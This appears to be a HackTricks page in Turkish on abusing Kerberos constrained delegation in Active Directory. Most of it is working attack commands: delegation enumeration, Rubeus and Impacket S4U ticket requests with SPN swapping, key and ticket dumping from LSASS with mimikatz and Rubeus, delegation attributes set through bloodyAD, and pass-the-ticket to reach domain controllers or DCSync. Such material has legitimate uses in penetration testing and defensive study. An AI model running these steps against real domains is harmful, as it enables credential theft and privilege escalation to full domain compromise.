# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

Bunu kullanarak bir Domain admin, bir bilgisayarın herhangi bir makinenin herhangi bir **service**'ine karşı **bir kullanıcıyı veya bilgisayarı taklit etmesine** **izin verebilir**.

- **Service for User to self (_S4U2self_):** Bir SPN sahibi olan herhangi bir **service account**, genellikle rastgele bir kullanıcı adına kendisine bir TGS alabilir. Hesap ayrıca _userAccountControl_ içinde [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) değerine sahipse, bu TGS **forwardable** olur. Classic constrained delegation için protocol transition'ı doğrudan kullanışlı yapan şey budur.
- **Service for User to Proxy(_S4U2proxy_):** Bir **service account**, **msDS-AllowedToDelegateTo** içinde listelenen SPN'lere bir kullanıcı adına TGS alabilir. S4U2Proxy'de kullanılan evidence ticket, delegasyon yapan service'e yönelik **forwardable** bir ticket olmalıdır: ya victim'dan yakalanmış gerçek bir client-to-service ticket ya da **S4U2Self + T2A4D** ile oluşturulmuş bir ticket.

**Note**: Bir kullanıcı AD'de ‘_Account is sensitive and cannot be delegated_’ olarak işaretlenmişse veya **Protected Users** üyesiyse, constrained delegation üzerinden bu kullanıcıyı **taklit edemezsiniz**. Modern domain'lerde delegation-enabled hesapları hedeflerken RC4-only varsayımları yerine **AES** material kullanmayı tercih edin.

Bu, **service'in hash'ini ele geçirirseniz**, kullanıcıları **taklit edebileceğiniz** ve belirtilen makineler üzerindeki herhangi bir **service**'e onların adına **erişim** elde edebileceğiniz anlamına gelir (olası **privesc**).

Ayrıca, **yalnızca kullanıcının taklit edebildiği service'e değil, herhangi bir service'e** de erişiminiz olur; çünkü SPN (istenen service name) kontrol edilmez (ticket içinde bu bölüm encrypted/signed değildir). Bu nedenle **CIFS service**'ine erişiminiz varsa, örneğin Rubeus'taki `/altservice` flag'ini kullanarak **HOST service**'ine de erişebilirsiniz. Aynı SPN swapping weakness, **Impacket getST -altservice** ve diğer tooling tarafından da abuse edilir.

Ayrıca, **DC üzerindeki LDAP service erişimi**, **DCSync** exploit etmek için gereken şeydir.
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Linux / LDAP enumeration
# NetExec: enumerate constrained / unconstrained / RBCD in one shot
nxc ldap dc.corp.local -u user -p 'Password123!' --find-delegation

# bloodyAD / msldap: LDAP-first enumeration from Linux
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap constrained
bloodyAD -H dc.corp.local -d corp.local -u user -p 'Password123!' msldap s4u2proxy
```
**Operatör notu:** **gMSA/sMSA** incelemesi için yalnızca **ADUC** veya BloodHound ekran görüntülerine güvenmeyin. Bu hesaplar genellikle alışılmış Delegation sekmesini gizler; bu nedenle ham **`userAccountControl`** ve **`msDS-AllowedToDelegateTo`** özniteliklerini doğrudan listeleyin.
```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
### Protocol-transition ve Kerberos-only constrained delegation

Ele geçirilmiş hesap **T2A4D** özelliğine sahipse, genellikle yalnızca service key/TGT kullanarak tam **`S4U2Self -> S4U2Proxy`** zincirini tamamlayabilirsiniz.<sup>[[2]](#references)</sup>

Hesapta yalnızca **`msDS-AllowedToDelegateTo`** varsa (klasik **"Use Kerberos only"** modu), delegation yine kötüye kullanılabilir; ancak S4U2Proxy için evidence ticket, delegation yapan service için **gerçek ve forwardable bir user-to-service ticket** olmalıdır. Pratikte bu, bir kurbanın TGS bilgisini **LSASS/ccache** üzerinden çalmak veya yakalamak ve bunu ikinci aşamaya (`/tgs:` in Rubeus) aktarmak anlamına gelir. **Non-forwardable** bir S4U2Self ticket, classic constrained delegation için **yeterli değildir**; elinizdeki tek evidence ticket buysa bunun yerine [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) yöntemini kontrol edin.<sup>[[2]](#references)</sup>

### Cross-domain constrained delegation notları (2025+)

**Windows Server 2012/2012 R2** sürümünden beri KDC, S4U2Proxy extensions aracılığıyla **domain/forest** sınırları arasında constrained delegation desteği sunar. Modern sürümler (Windows Server 2016–2025) bu davranışı korur ve protocol transition'ı belirtmek için iki PAC SID'i ekler:<sup>[[1]](#references)</sup>

- `S-1-18-1` (**AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY**), kullanıcı normal şekilde authenticate olduğunda.
- `S-1-18-2` (**SERVICE_ASSERTED_IDENTITY**), bir service protocol transition aracılığıyla identity'yi doğruladığında.

Domain'ler arasında protocol transition kullanıldığında PAC içinde `SERVICE_ASSERTED_IDENTITY` bulunmasını bekleyin; bu, S4U2Proxy adımının başarıyla tamamlandığını doğrular.<sup>[[1]](#references)</sup>

### Impacket / Linux tooling (altservice & full S4U)

Recent Impacket (0.11.x+) Rubeus ile aynı S4U chain ve SPN swapping özelliklerini sunar:<sup>[[2]](#references)</sup>
```bash
# Get TGT for delegating service (hash/aes)
getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d

# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOST
getST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \
-impersonate Administrator contoso.local/websvc$ \
-hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5

# Inject resulting ccache
export KRB5CCNAME=Administrator.ccache
smbclient -k //dc.contoso.local/C$ -c 'dir'

# If you already have a ticket/ccache for the right host, rewrite only the service class offline
# (same SPN-swapping idea as Rubeus /altservice)
tgssub.py -in Administrator.ccache -out Administrator_HOST.ccache -altservice host/dc.contoso.local
export KRB5CCNAME=Administrator_HOST.ccache
```
User ST'yi önce forge etmeyi tercih ediyorsanız (ör. yalnızca offline hash ile), S4U2Proxy için **ticketer.py** ile **getST.py**'yi birlikte kullanın. Çalışan bir ccache'iniz varsa ve aynı host için yalnızca service class'ı değiştirmeniz gerekiyorsa **tgssub.py** de kullanışlıdır. Güncel sorunlar için Impacket issue #1713'e bakın (forged ST, SPN key ile eşleşmediğinde KRB_AP_ERR_MODIFIED).<sup>[[2]](#references)</sup>

### Düşük yetkili kimlik bilgileriyle delegation kurulumunu otomatikleştirme

Bir computer veya service account üzerinde zaten **GenericAll/WriteDACL** yetkiniz varsa, **bloodyAD** (2024+) kullanarak gerekli attribute'ları RSAT olmadan uzaktan gönderebilirsiniz:
```bash
# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DC
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATION
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local'
```
Bu, bu özniteliklere yazma yetkisi elde eder etmez DA ayrıcalıkları olmadan privesc için bir constrained delegation path oluşturmanızı sağlar.

- Step 1: **İzin verilen service'in TGT'sini alın**
```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> **Printer Bug**, **unconstrain delegation**, **NTLM relaying** ve **Active Directory Certificate Service abuse** gibi, bilgisayarda SYSTEM olmadan **TGT ticket** veya **RC4** ya da **AES256** elde etmenin başka yolları da vardır.
>
> **Yalnızca bu TGT ticket'a (veya hash'lenmiş hâline) sahip olarak, bilgisayarın tamamını compromise etmeden bu attack'u gerçekleştirebilirsiniz.**

- Step2: **Kullanıcıyı impersonating ederek servis için TGS alın**
```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the Constained allowed user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**ired.team adresinde daha fazla bilgi.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) ve [**https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61**](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)<sup>[[3]](#references)[[4]](#references)</sup>

## Referanslar

- [1] [Kerberos Constrained Delegation Genel Bakışı (Microsoft Learn, 2025)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [2] [Impacket ile Delegation Kötüye Kullanımı (Bölüm 2): Constrained Delegation (Black Hills, 2025)](https://www.blackhillsinfosec.com/abusing-delegation-with-impacket-part-2/)
- [3] [Kerberos Constrained Delegation (ired.team)](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
- [4] [Kerberosity Killed the Domain: An Offensive Kerberos Overview (SpecterOps)](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)

{{#include ../../banners/hacktricks-training.md}}
